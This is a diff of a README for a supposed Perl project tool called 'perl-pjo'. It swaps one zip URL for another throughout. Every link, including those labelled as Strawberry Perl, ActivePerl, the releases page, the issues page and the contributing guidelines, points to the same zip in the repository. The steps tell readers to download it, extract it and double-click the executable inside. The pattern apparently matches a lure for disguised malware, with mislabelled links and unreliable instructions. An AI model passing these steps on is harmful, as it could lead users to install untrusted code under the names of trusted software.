@@ -1,7 +1,7 @@
 # 🖥️ perl-pjo - Easily Manage Your Perl Projects
 
 ## 📥 Download Now
-[![Download perl-pjo](https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip)](https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip)
+[![Download perl-pjo](https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip)](https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Make sure your system meets the following requirements to run perl-pjo:
 - **Operating System:** Windows, macOS, or Linux
 - **RAM:** At least 2 GB of RAM
 - **Disk Space:** Minimum of 100 MB of free space
-- **Perl:** You need to have Perl installed. You can download it from [Strawberry Perl](https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip) for Windows or [ActivePerl](https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip) for macOS and Linux.
+- **Perl:** You need to have Perl installed. You can download it from [Strawberry Perl](https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip) for Windows or [ActivePerl](https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip) for macOS and Linux.
 
 ## 📃 Features
 
@@ -27,15 +27,15 @@ perl-pjo offers various features to enhance your project management:
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip) to find the latest version of perl-pjo. 
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip) to find the latest version of perl-pjo. 
    
 2. **Select the Latest Release:** Click on the latest version link. This will take you to a page where you can see all available files for download.
 
-3. **Download the Application:** Look for the file named `https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip` (or similar) in the assets section. Click on it to start the download. 
+3. **Download the Application:** Look for the file named `https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip` (or similar) in the assets section. Click on it to start the download. 
 
 4. **Extract the Files:** Once the download completes, locate the zip file on your computer. Right-click on the file and select "Extract All" to unzip it.
 
-5. **Run the Application:** After extraction, navigate to the folder where you unzipped perl-pjo. Look for the executable file, usually named `https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip`. Double-click on this file to launch the application.
+5. **Run the Application:** After extraction, navigate to the folder where you unzipped perl-pjo. Look for the executable file, usually named `https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip`. Double-click on this file to launch the application.
 
 ## 🛠️ Usage Instructions
 
@@ -50,15 +50,15 @@ After installation:
 
 ### Q1: How do I update perl-pjo?
 
-To update perl-pjo, return to the [Releases page](https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip), download the latest version, and follow the installation steps again.
+To update perl-pjo, return to the [Releases page](https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip), download the latest version, and follow the installation steps again.
 
 ### Q2: What if I encounter issues?
 
-Visit our [Issues page](https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip) to report any problems. You can also browse existing issues for possible solutions.
+Visit our [Issues page](https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip) to report any problems. You can also browse existing issues for possible solutions.
 
 ### Q3: Can I contribute to perl-pjo?
 
-Absolutely! We welcome contributions. Please check our [Contributing Guidelines](https://raw.githubusercontent.com/Canelles1982/perl-pjo/main/buffy/perl-pjo.zip) for more details.
+Absolutely! We welcome contributions. Please check our [Contributing Guidelines](https://github.com/Canelles1982/perl-pjo/raw/refs/heads/main/buffy/pjo-perl-v1.0.zip) for more details.
 
 ## 🛡️ License
 
